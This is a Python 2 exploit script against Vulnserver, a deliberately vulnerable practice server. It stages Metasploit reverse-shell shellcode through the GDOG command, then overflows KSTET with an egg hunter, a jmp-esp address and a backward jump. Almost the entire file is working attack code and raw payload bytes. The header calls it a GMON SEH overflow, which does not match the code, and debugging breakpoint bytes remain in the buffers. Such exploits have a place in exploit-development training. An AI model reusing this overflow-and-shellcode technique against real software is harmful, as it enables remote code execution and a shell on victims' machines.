#!/usr/bin/env python2

# Exploit Title: Vulnserver SEH OVerflow for GMON command (no DEP, no ASLR)
#                Uses Egg hunter to reach shellcode stored previously using the GDOG command
# Date: 02/17/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A

import socket
import sys
import logging

offset=70

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b "\x00\x0a\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbd\xb4\xf4\x24\x27\xda\xc6\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xee\xfc\x31\x6e\x0e"
shellcode += b"\x03\xda\xfa\xc6\xd2\xde\xeb\x85\x1d\x1e\xec"
shellcode += b"\xe9\x94\xfb\xdd\x29\xc2\x88\x4e\x9a\x80\xdc"
shellcode += b"\x62\x51\xc4\xf4\xf1\x17\xc1\xfb\xb2\x92\x37"
shellcode += b"\x32\x42\x8e\x04\x55\xc0\xcd\x58\xb5\xf9\x1d"
shellcode += b"\xad\xb4\x3e\x43\x5c\xe4\x97\x0f\xf3\x18\x93"
shellcode += b"\x5a\xc8\x93\xef\x4b\x48\x40\xa7\x6a\x79\xd7"
shellcode += b"\xb3\x34\x59\xd6\x10\x4d\xd0\xc0\x75\x68\xaa"
shellcode += b"\x7b\x4d\x06\x2d\xad\x9f\xe7\x82\x90\x2f\x1a"
shellcode += b"\xda\xd5\x88\xc5\xa9\x2f\xeb\x78\xaa\xf4\x91"
shellcode += b"\xa6\x3f\xee\x32\x2c\xe7\xca\xc3\xe1\x7e\x99"
shellcode += b"\xc8\x4e\xf4\xc5\xcc\x51\xd9\x7e\xe8\xda\xdc"
shellcode += b"\x50\x78\x98\xfa\x74\x20\x7a\x62\x2d\x8c\x2d"
shellcode += b"\x9b\x2d\x6f\x91\x39\x26\x82\xc6\x33\x65\xcb"
shellcode += b"\x2b\x7e\x95\x0b\x24\x09\xe6\x39\xeb\xa1\x60"
shellcode += b"\x72\x64\x6c\x77\x75\x5f\xc8\xe7\x88\x60\x29"
shellcode += b"\x2e\x4f\x34\x79\x58\x66\x35\x12\x98\x87\xe0"
shellcode += b"\xb5\xc8\x27\x5b\x76\xb8\x87\x0b\x1e\xd2\x07"
shellcode += b"\x73\x3e\xdd\xcd\x1c\xd5\x24\x86\x5d\x2a\x26"
shellcode += b"\x57\xca\x28\x26\x42\xb9\xa4\xc0\x06\xad\xe0"
shellcode += b"\x5b\xbf\x54\xa9\x17\x5e\x98\x67\x52\x60\x12"
shellcode += b"\x84\xa3\x2f\xd3\xe1\xb7\xd8\x13\xbc\xe5\x4f"
shellcode += b"\x2b\x6a\x81\x0c\xbe\xf1\x51\x5a\xa3\xad\x06"
shellcode += b"\x0b\x15\xa4\xc2\xa1\x0c\x1e\xf0\x3b\xc8\x59"
shellcode += b"\xb0\xe7\x29\x67\x39\x65\x15\x43\x29\xb3\x96"
shellcode += b"\xcf\x1d\x6b\xc1\x99\xcb\xcd\xbb\x6b\xa5\x87"
shellcode += b"\x10\x22\x21\x51\x5b\xf5\x37\x5e\xb6\x83\xd7"
shellcode += b"\xef\x6f\xd2\xe8\xc0\xe7\xd2\x91\x3c\x98\x1d"
shellcode += b"\x48\x85\xa8\x57\xd0\xac\x20\x3e\x81\xec\x2c"
shellcode += b"\xc1\x7c\x32\x49\x42\x74\xcb\xae\x5a\xfd\xce"
shellcode += b"\xeb\xdc\xee\xa2\x64\x89\x10\x10\x84\x98"



if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

output = s.recv(1024)
print output

buf = "GDOG "
buf += "w00tw00t" 
buf += "\x90\x90\x90\xcc"
buf += shellcode
buf += '\r\n'


s.send(buf)
output = s.recv(1024)
print output


buf  = "KSTET "
buf += "\x90"* 9		 
buf += "\xcc"		 
buf += egghunter
buf += "\x90" * (offset - (10 + len(egghunter)))
buf += "\xd3\x11\x50\x62" 	# jmp esp 
buf += "\xeb\xb8\x90\x90"	# jmp back of 72 to reach egghunter
buf += "D" * 300
buf += '\r\n'


s.send(buf)
output = s.recv(1024)
print output